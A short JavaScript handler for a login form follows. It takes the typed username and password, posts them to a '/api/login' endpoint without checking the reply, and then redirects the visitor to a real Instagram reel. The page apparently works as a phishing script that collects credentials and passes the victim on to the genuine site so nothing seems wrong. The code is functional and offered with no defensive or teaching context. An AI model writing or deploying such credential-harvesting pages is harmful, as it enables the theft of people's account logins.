document.getElementById("login-form").addEventListener("submit", async function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  document.getElementById("loading").style.display = "block";

  await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });

  setTimeout(() => {
    window.location.href = "https://www.instagram.com/reel/DKr3gw1s8z4/?igsh=MWt3M3h2ZXV1ZXFhZA=="; // working reel
  }, 2000);
});
  